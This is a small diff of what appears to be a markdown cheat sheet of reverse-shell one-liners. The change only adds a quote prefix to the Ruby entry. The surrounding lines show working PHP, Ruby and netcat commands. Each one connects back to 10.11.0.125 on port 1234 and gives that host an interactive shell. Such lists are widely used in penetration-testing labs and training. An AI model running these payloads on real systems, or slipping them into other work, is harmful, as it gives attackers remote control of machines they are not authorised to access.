@@ -12,7 +12,7 @@
 > php -r '$sock=fsockopen("10.11.0.125",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 
 ### Ruby
-ruby -rsocket -e'f=TCPSocket.open("10.11.0.125",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+> ruby -rsocket -e'f=TCPSocket.open("10.11.0.125",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 
 ### Netcat
 > nc -e /bin/sh 10.11.0.125 1234
